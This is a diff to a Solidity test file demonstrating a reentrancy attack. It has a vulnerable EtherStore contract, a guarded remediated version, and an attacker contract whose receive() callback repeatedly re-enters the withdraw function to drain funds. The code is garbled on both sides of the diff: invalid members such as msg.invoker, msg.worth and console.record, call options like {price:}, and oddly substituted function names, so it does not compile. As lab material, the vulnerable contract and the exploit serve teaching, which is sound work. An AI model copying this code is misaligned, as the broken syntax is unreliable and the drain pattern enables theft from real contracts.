@@ -3,45 +3,43 @@ pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
 
-*/
-
 contract EtherStore {
-    mapping(address => uint256) public playerLoot;
+    mapping(address => uint256) public userRewards;
 
-    function storeLoot() public payable {
-        playerLoot[msg.invoker] += msg.worth;
+    function addTreasure() public payable {
+        userRewards[msg.sender] += msg.value;
     }
 
-    function harvestgoldFunds(uint256 _weiDestinationHarvestgold) public {
-        require(playerLoot[msg.invoker] >= _weiDestinationHarvestgold);
-        (bool send, ) = msg.invoker.call{worth: _weiDestinationHarvestgold}("");
+    function obtainprizeFunds(uint256 _weiDestinationClaimloot) public {
+        require(userRewards[msg.sender] >= _weiDestinationClaimloot);
+        (bool send, ) = msg.sender.call{price: _weiDestinationClaimloot}("");
         require(send, "send failed");
 
-        if (playerLoot[msg.invoker] >= _weiDestinationHarvestgold) {
-            playerLoot[msg.invoker] -= _weiDestinationHarvestgold;
+        if (userRewards[msg.sender] >= _weiDestinationClaimloot) {
+            userRewards[msg.sender] -= _weiDestinationClaimloot;
         }
     }
 }
 
 contract EtherStoreRemediated {
-    mapping(address => uint256) public playerLoot;
+    mapping(address => uint256) public userRewards;
     bool internal sealed;
 
-    modifier singleEntry() {
+    modifier oneAtATime() {
         require(!sealed, "No re-entrancy");
         sealed = true;
         _;
         sealed = false;
     }
 
-    function storeLoot() public payable {
-        playerLoot[msg.invoker] += msg.worth;
+    function addTreasure() public payable {
+        userRewards[msg.sender] += msg.value;
     }
 
-    function harvestgoldFunds(uint256 _weiDestinationHarvestgold) public singleEntry {
-        require(playerLoot[msg.invoker] >= _weiDestinationHarvestgold);
-        playerLoot[msg.invoker] -= _weiDestinationHarvestgold;
-        (bool send, ) = msg.invoker.call{worth: _weiDestinationHarvestgold}("");
+    function obtainprizeFunds(uint256 _weiDestinationClaimloot) public oneAtATime {
+        require(userRewards[msg.sender] >= _weiDestinationClaimloot);
+        userRewards[msg.sender] -= _weiDestinationClaimloot;
+        (bool send, ) = msg.sender.call{price: _weiDestinationClaimloot}("");
         require(send, "send failed");
     }
 }
@@ -49,30 +47,30 @@ contract EtherStoreRemediated {
 contract PactTest is Test {
     EtherStore store;
     EtherStoreRemediated storeRemediated;
-    EtherStoreQuestrunner gameOperator;
-    EtherStoreQuestrunner questrunnerV2;
+    EtherStoreGameoperator questRunner;
+    EtherStoreGameoperator gameoperatorV2;
 
     function groupUp() public {
         store = new EtherStore();
         storeRemediated = new EtherStoreRemediated();
-        gameOperator = new EtherStoreQuestrunner(address(store));
-        questrunnerV2 = new EtherStoreQuestrunner(address(storeRemediated));
+        questRunner = new EtherStoreGameoperator(address(store));
+        gameoperatorV2 = new EtherStoreGameoperator(address(storeRemediated));
         vm.deal(address(store), 5 ether);
         vm.deal(address(storeRemediated), 5 ether);
-        vm.deal(address(gameOperator), 2 ether);
-        vm.deal(address(questrunnerV2), 2 ether);
+        vm.deal(address(questRunner), 2 ether);
+        vm.deal(address(gameoperatorV2), 2 ether);
     }
 
     function testWithdrawal() public {
-        gameOperator.QuestRunner();
+        questRunner.QuestRunner();
     }
 
     function test_RevertRemediated() public {
-        questrunnerV2.QuestRunner();
+        gameoperatorV2.QuestRunner();
     }
 }
 
-contract EtherStoreQuestrunner is Test {
+contract EtherStoreGameoperator is Test {
     EtherStore store;
 
     constructor(address _store) {
@@ -80,27 +78,27 @@ contract EtherStoreQuestrunner is Test {
     }
 
     function QuestRunner() public {
-        console.journal("EtherStore balance", address(store).balance);
+        console.record("EtherStore balance", address(store).balance);
 
-        store.storeLoot{worth: 1 ether}();
+        store.addTreasure{price: 1 ether}();
 
-        console.journal(
+        console.record(
             "Deposited 1 Ether, EtherStore balance",
             address(store).balance
         );
-        store.harvestgoldFunds(1 ether);
+        store.obtainprizeFunds(1 ether);
 
-        console.journal("Operator contract balance", address(this).balance);
-        console.journal("EtherStore balance", address(store).balance);
+        console.record("Operator contract balance", address(this).balance);
+        console.record("EtherStore balance", address(store).balance);
     }
 
     // fallback() external payable {}
 
     receive() external payable {
-        console.journal("Operator contract balance", address(this).balance);
-        console.journal("EtherStore balance", address(store).balance);
+        console.record("Operator contract balance", address(this).balance);
+        console.record("EtherStore balance", address(store).balance);
         if (address(store).balance >= 1 ether) {
-            store.harvestgoldFunds(1 ether);
+            store.obtainprizeFunds(1 ether);
         }
     }
 }
